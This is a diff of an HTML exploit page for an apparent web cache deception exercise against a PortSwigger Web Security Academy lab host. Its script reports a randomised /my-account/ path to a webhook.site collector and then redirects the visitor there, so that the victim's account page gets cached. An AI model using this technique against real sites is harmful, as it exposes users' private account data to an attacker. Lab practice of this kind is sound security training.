@@ -1,13 +1,26 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+</head>
 <body>
 <script>
-  document.location="https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net/my-account/poc999.js";
+  const id = Math.random().toString(36).substring(2, 8);
+  const path = "/my-account/poc" + id + ".js";
+  const target = "https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net" + path;
+  
+  // sendBeacon survives page navigation — most reliable method
+  navigator.sendBeacon(
+    "https://webhook.site/04a0f607-8cea-42e8-94c8-828afff2780d",
+    JSON.stringify({ 
+      victim_path: path,
+      full_url: target,
+      time: new Date().toISOString() 
+    })
+  );
+  
+  // Small delay to let beacon fire, then redirect
+  setTimeout(() => { document.location = target; }, 500);
 </script>
 </body>
 </html>
-```
-
-Then you already know the URL to visit:
-```
-https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net/my-account/poc999.js
